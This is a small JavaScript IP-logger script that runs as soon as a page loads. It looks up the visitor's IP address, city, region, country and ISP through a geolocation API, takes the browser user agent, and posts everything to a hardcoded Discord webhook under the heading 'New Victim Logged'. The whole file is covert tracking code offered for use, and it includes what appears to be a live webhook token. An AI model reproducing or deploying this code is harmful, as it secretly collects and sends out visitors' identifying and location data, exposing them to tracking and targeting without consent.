const webhook = "https://discord.com/api/webhooks/1489972140680679514/y3WNCXz1DgvFnYtfXME1cWRiEwhoBATmkDnUfI85b07Sl93r3QGePcnWJlzTOcpjU8hC"

async function sendIP() {
    try {
        let response = await fetch("https://ipapi.co/json/");
        let data = await response.json();

        await fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: "**New Victim Logged**",
                embeds: [{
                    title: "IP Logger - New Hit",
                    color: 0x00ff00,
                    fields: [
                        { name: "IP", value: `\`${data.ip}\``, inline: true },
                        { name: "Country", value: `${data.country_name || "Unknown"}`, inline: true },
                        { name: "City", value: `${data.city || "Unknown"}`, inline: true },
                        { name: "Region", value: `${data.region || "Unknown"}`, inline: true },
                        { name: "ISP", value: `${data.org || "Unknown"}`, inline: false },
                        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                    ],
                    footer: { text: "Made by Z3NTL3" },
                    timestamp: new Date().toISOString()
                }]
            })
        });

        console.log("IP Sent Successfully");
    } catch (err) {
        console.log("Error:", err);
    }
}

sendIP();
